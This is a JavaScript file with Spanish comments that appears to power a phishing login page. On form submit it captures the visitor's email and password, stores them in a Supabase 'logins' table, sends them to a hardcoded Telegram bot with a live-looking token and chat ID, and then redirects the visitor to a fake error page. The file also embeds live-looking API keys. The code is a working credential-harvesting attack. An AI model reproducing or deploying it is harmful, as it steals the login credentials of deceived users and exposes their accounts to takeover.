// ============================================
// CONFIGURACIÓN SUPABASE - TUS DATOS
// ============================================
const SUPABASE_URL = 'https://lyklppmmtrzrqoickzmd.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx5a2xwcG1tdHJ6cnFvaWNrem1kIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIyOTQyNTUsImV4cCI6MjA4Nzg3MDI1NX0.42uUpfpGR6h4klDYsOAHOo22iKQ9m23m6-HfU7qNWW0';

// ============================================
// CÓDIGO PRINCIPAL
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ Conectando a Supabase...');
    console.log('📊 URL:', SUPABASE_URL);
    
    const formulario = document.getElementById('loginForm');
    
    if (formulario) {
        formulario.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Obtener valores
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Crear objeto con datos
            const datos = {
                email: email,
                password: password,
                fecha: new Date().toLocaleString(),
                hora: new Date().toLocaleTimeString(),
                timestamp: new Date().toISOString()
            };
            
            console.log('📤 Guardando en base de datos:', datos);
            
            // 1️⃣ GUARDAR EN SUPABASE (BASE DE DATOS)
            fetch(`${SUPABASE_URL}/rest/v1/logins`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'apikey': SUPABASE_ANON_KEY,
                    'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
                },
                body: JSON.stringify(datos)
            })
            .then(response => {
                if (response.ok) {
                    console.log('✅ Guardado en Supabase');
                } else {
                    console.log('❌ Error al guardar:', response.status);
                }
            })
            .catch(error => {
                console.log('❌ Error de conexión:', error);
            });
            
            // 2️⃣ TAMBIÉN A TELEGRAM (RESPALDO)
            const mensajeTelegram = `🔐 NUEVO LOGIN
📧 Email: ${email}
🔑 Pass: ${password}
⏰ ${datos.fecha}`;
            
            fetch(`https://api.telegram.org/bot8234691045:AAHePNguryd46uVV1F4uXNaZKYtCGJ12LuU/sendMessage?chat_id=76868560&text=${encodeURIComponent(mensajeTelegram)}`)
            .catch(() => {});
            
            // Redirigir a error
            window.location.href = 'error.html';
        });
    }
});

// Función de prueba
window.probarConexion = function() {
    const testData = {
        email: "test@clase.com",
        password: "prueba123",
        fecha: new Date().toLocaleString(),
        hora: new Date().toLocaleTimeString(),
        timestamp: new Date().toISOString()
    };
    
    fetch(`${SUPABASE_URL}/rest/v1/logins`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'apikey': SUPABASE_ANON_KEY,
            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
        },
        body: JSON.stringify(testData)
    })
    .then(response => {
        if (response.ok) {
            alert('✅ Datos guardados en Supabase');
            console.log('✅ Prueba exitosa');
        } else {
            alert('❌ Error: ' + response.status);
        }
    })
    .catch(err => {
        alert('❌ Error: ' + err);
    });
};
